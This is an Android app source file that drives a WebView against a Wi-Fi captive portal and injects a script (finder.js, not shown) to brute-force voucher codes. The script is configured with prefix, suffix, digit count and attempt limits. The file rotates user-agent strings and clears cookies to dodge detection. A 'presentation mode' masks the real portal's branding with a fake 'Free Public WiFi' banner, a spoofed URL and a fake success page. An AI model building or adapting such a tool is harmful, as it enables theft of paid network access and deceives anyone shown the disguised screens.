package com.example.networkbrowserdemo;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.webkit.*;
import android.widget.*;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public class MainActivity extends Activity {
    private WebView webView;
    private EditText urlBar, etPrefix, etSuffix, etDigits, etAttempts, etPause, etRetry, etStatusEvery, etThreads;
    private TextView statusText, logText, voucherResult;
    private Button btnPresentation;
    private SharedPreferences prefs;
    private String finderJs = "";
    private String targetUrl = "";
    private StringBuilder logBuf = new StringBuilder();
    private Handler uiHandler = new Handler(Looper.getMainLooper());
    private boolean logUpdatePending = false;
    private boolean stoppedState = false;
    private boolean isRunning = false;
    private boolean presentationMode = false;
    private final Random rand = new Random();

    private final String[] UAS = {
        "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 Chrome/118.0 Mobile",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 Chrome/115.0 Mobile",
        "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 Chrome/110.0 Mobile",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile"
    };

    @SuppressLint("SetJavaScriptEnabled")
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences("finder", MODE_PRIVATE);

        urlBar = findViewById(R.id.urlBar);
        etPrefix = findViewById(R.id.etPrefix);
        etSuffix = findViewById(R.id.etSuffix);
        etDigits = findViewById(R.id.etDigits);
        etAttempts = findViewById(R.id.etAttempts);
        etPause = findViewById(R.id.etPause);
        etRetry = findViewById(R.id.etRetry);
        etStatusEvery = findViewById(R.id.etStatusEvery);
        etThreads = findViewById(R.id.etThreads);
        statusText = findViewById(R.id.statusText);
        logText = findViewById(R.id.logText);
        voucherResult = findViewById(R.id.voucherResult);
        webView = findViewById(R.id.webView);
        btnPresentation = findViewById(R.id.btnPresentation);

        targetUrl = prefs.getString("url", "http://7.7.7.7/index.html");
        urlBar.setText(targetUrl);
        etPrefix.setText(prefs.getString("prefix", "5"));
        etSuffix.setText(prefs.getString("suffix", "31"));
        etDigits.setText(prefs.getString("digits", "7"));
        etAttempts.setText(prefs.getString("attempts", "1000"));
        etPause.setText(prefs.getString("pause", "1000"));
        etRetry.setText(prefs.getString("retry", "1000"));
        etStatusEvery.setText(prefs.getString("statusEvery", "50"));
        etThreads.setText("1");

        try {
            InputStream is = getAssets().open("finder.js");
            byte[] buf = new byte[is.available()];
            is.read(buf); is.close();
            finderJs = new String(buf, StandardCharsets.UTF_8);
        } catch (Exception e) { appendLog("خطأ تحميل JS: " + e.getMessage()); }

        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        webView.addJavascriptInterface(new Bridge(0), "AndroidBridge0");

        webView.setWebViewClient(new WebViewClient() {
            @Override public void onPageFinished(WebView view, String url) {
                if (presentationMode) {
                    applyPresentationMask();
                    urlBar.setText("https://portal.freewifi.com");
                } else {
                    urlBar.setText(url);
                }
                
                if (isRunning) {
                    String p = etPrefix.getText().toString().trim();
                    String s = etSuffix.getText().toString().trim();
                    int d = parseInt(etDigits, 7);
                    int a = parseInt(etAttempts, 1000);
                    int pz = parseInt(etPause, 1000);
                    String cfg = "window.FINDER_CONFIG={id:0,prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";
                    view.evaluateJavascript(cfg, null);
                    view.evaluateJavascript(finderJs, null);
                }
            }
        });

        findViewById(R.id.btnGo).setOnClickListener(v -> {
            if (presentationMode) {
                if (targetUrl != null && !targetUrl.isEmpty()) webView.loadUrl(targetUrl);
            } else {
                targetUrl = urlBar.getText().toString().trim();
                if (!targetUrl.startsWith("http")) targetUrl = "http://" + targetUrl;
                prefs.edit().putString("url", targetUrl).apply();
                webView.getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
                webView.loadUrl(targetUrl);
            }
        });

        findViewById(R.id.btnFinder).setOnClickListener(v -> {
            View panel = findViewById(R.id.panel);
            panel.setVisibility(panel.getVisibility() == View.VISIBLE ? View.GONE : View.VISIBLE);
        });

        findViewById(R.id.btnBack).setOnClickListener(v -> { if (webView.canGoBack()) webView.goBack(); });
        findViewById(R.id.btnForward).setOnClickListener(v -> { if (webView.canGoForward()) webView.goForward(); });
        findViewById(R.id.btnRefresh).setOnClickListener(v -> webView.reload());

        btnPresentation.setOnClickListener(v -> togglePresentationMode());

        findViewById(R.id.btnStart).setOnClickListener(v -> startAll());
        findViewById(R.id.btnStop).setOnClickListener(v -> stopAll());
        findViewById(R.id.btnClear).setOnClickListener(v -> {
            prefs.edit().remove("tried_" + targetUrl).apply();
            CookieManager.getInstance().removeAllCookies(null);
            CookieManager.getInstance().flush();
            logBuf.setLength(0);
            logText.setText("");
            voucherResult.setVisibility(View.GONE);
            appendLog("🗑️ تم مسح الكوكيز والأرقام");
        });

        webView.getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
        webView.loadUrl(targetUrl);
    }

    private void togglePresentationMode() {
        presentationMode = !presentationMode;
        if (presentationMode) {
            btnPresentation.setText("🎬 وضع العرض: مُفعّل ✅");
            appendLog("🎬 وضع العرض مُفعّل");
            Toast.makeText(this, "وضع العرض مُفعّل", Toast.LENGTH_SHORT).show();
            applyPresentationMask();
            urlBar.setText("https://portal.freewifi.com");
        } else {
            btnPresentation.setText("🎬 وضع العرض: مُعطّل");
            appendLog("🎬 وضع العرض مُعطّل");
            Toast.makeText(this, "وضع العرض مُعطّل", Toast.LENGTH_SHORT).show();
            if (targetUrl != null && !targetUrl.isEmpty()) webView.loadUrl(targetUrl);
        }
    }

    private void applyPresentationMask() {
        String js = "(function(){" +
            "if(document.getElementById('pres-style'))return;" +
            "var s=document.createElement('style');" +
            "s.id='pres-style';" +
            "s.textContent='.brand-dates,.logo,.nettitle,.brand-divider,.brand-actions,.login-frame-title,.welcome-modal-overlay,.live-stream-btn-wrapper,.footer-credits,.quran-verse-box,.services-frame,.login-tools-frame,.manual-entry-separator,a[href^=\"tel:\"]{display:none!important;}'+" +
            "'body{background:linear-gradient(135deg,#1a1a2e,#16213e)!important;}'+" +
            "'.login-frame,.main-frame{background:rgba(22,33,62,0.9)!important;border-radius:15px;padding:20px;}'+" +
            "'.login-input,.login-field{background:rgba(255,255,255,0.95)!important;border-radius:10px;}'+" +
            "'.login-submit{background:linear-gradient(90deg,#00d4ff,#0077cc)!important;color:#fff!important;border-radius:10px;font-weight:bold;}';" +
            "document.head.appendChild(s);" +
            "var f=document.getElementById('fake-banner');" +
            "if(!f){f=document.createElement('div');" +
            "f.id='fake-banner';" +
            "f.style.cssText='position:sticky;top:0;z-index:99999;text-align:center;" +
            "padding:18px;font-size:22px;font-weight:bold;color:#00d4ff;" +
            "background:#0a0e27;border-bottom:2px solid #00d4ff;font-family:sans-serif;';" +
            "f.textContent='📶 Free Public WiFi - Login';" +
            "document.body.insertBefore(f,document.body.firstChild);}" +
            "})()";
        webView.evaluateJavascript(js, null);
    }

    private void startAll() {
        stoppedState = false;
        isRunning = true;
        prefs.edit()
            .putString("prefix", etPrefix.getText().toString())
            .putString("suffix", etSuffix.getText().toString())
            .putString("digits", etDigits.getText().toString())
            .putString("attempts", etAttempts.getText().toString())
            .putString("pause", etPause.getText().toString())
            .putString("retry", etRetry.getText().toString())
            .putString("statusEvery", etStatusEvery.getText().toString())
            .apply();

        String p = etPrefix.getText().toString().trim();
        String s = etSuffix.getText().toString().trim();
        int d = parseInt(etDigits, 7);
        int a = parseInt(etAttempts, 1000);
        int pz = parseInt(etPause, 1000);

        appendLog("▶ بدء التخمين");
        voucherResult.setVisibility(View.GONE);
        statusText.setText("جاري التخمين...");

        webView.getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
        String cfg = "window.FINDER_CONFIG={id:0,prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";
        webView.evaluateJavascript(cfg, null);
        webView.evaluateJavascript(finderJs, null);
    }

    private void stopAll() {
        stoppedState = true;
        isRunning = false;
        webView.evaluateJavascript("window.stopFinder && window.stopFinder();", null);
        statusText.setText("⏹ تم الإيقاف");
        appendLog("⏹ تم الإيقاف");
    }

    private int parseInt(EditText e, int def) {
        try { return Integer.parseInt(e.getText().toString().trim()); } catch (Exception ex) { return def; }
    }

    private void appendLog(String msg) {
        logBuf.append(msg).append('\n');
        if (logBuf.length() > 20000) logBuf.delete(0, 15000);
        if (!logUpdatePending) {
            logUpdatePending = true;
            uiHandler.postDelayed(() -> {
                logText.setText(logBuf.toString());
                findViewById(R.id.logScroll).post(() -> ((ScrollView) findViewById(R.id.logScroll)).fullScroll(View.FOCUS_DOWN));
                logUpdatePending = false;
            }, 100);
        }
    }

    public class Bridge {
        private final int id;
        public Bridge(int id) { this.id = id; }
        
        @JavascriptInterface public void log(String m) { runOnUiThread(() -> appendLog("[W" + id + "] " + m)); }
        @JavascriptInterface public void progress(int c, int t, String v) { runOnUiThread(() -> statusText.setText("[" + c + "/" + t + "] " + v)); }
        @JavascriptInterface public void clearCookies() { runOnUiThread(() -> { CookieManager.getInstance().removeAllCookies(null); CookieManager.getInstance().flush(); }); }
        
        @JavascriptInterface public void found(String v, String st) {
            runOnUiThread(() -> {
                appendLog("✅✅✅ وجد الكرت: " + v);
                statusText.setText("✅ وجد الكرت!");
                
                if (presentationMode) {
                    String fakeHtml = "<!DOCTYPE html><html><head><meta charset='UTF-8'>" +
                        "<meta name='viewport' content='width=device-width,initial-scale=1'>" +
                        "<style>body{background:linear-gradient(135deg,#1a1a2e,#16213e);color:#fff;" +
                        "font-family:'Segoe UI',sans-serif;text-align:center;padding:40px 20px;" +
                        "margin:0;min-height:100vh;display:flex;flex-direction:column;" +
                        "justify-content:center;align-items:center;}" +
                        "h1{font-size:44px;color:#00ff88;margin:20px 0;text-shadow:0 0 30px rgba(0,255,136,0.6);}" +
                        ".icon{font-size:100px;margin-bottom:20px;}" +
                        ".voucher{background:#fff;color:#1a1a2e;padding:35px 25px;border-radius:20px;" +
                        "font-size:36px;font-weight:900;margin:30px 0;" +
                        "box-shadow:0 15px 40px rgba(0,212,255,0.5);letter-spacing:4px;font-family:monospace;}" +
                        ".subtitle{font-size:18px;opacity:0.85;margin:10px 0;}" +
                        ".hint{font-size:14px;opacity:0.6;margin-top:30px;}" +
                        "</style></head><body>" +
                        "<div class='icon'>🎉</div>" +
                        "<h1>Connected Successfully!</h1>" +
                        "<p class='subtitle'>Your WiFi Voucher Has Been Found</p>" +
                        "<div class='voucher'>" + v + "</div>" +
                        "<p class='subtitle'>✅ Enjoy Your Free Internet</p>" +
                        "<p class='hint'>Powered by Network Browser</p>" +
                        "</body></html>";
                    webView.loadDataWithBaseURL(null, fakeHtml, "text/html", "UTF-8", null);
                }
                
                voucherResult.setText("✅ الكرت: " + v);
                voucherResult.setVisibility(View.VISIBLE);
                Toast.makeText(MainActivity.this, "✅ " + v, Toast.LENGTH_LONG).show();
                stopAll();
            });
        }
    }
}
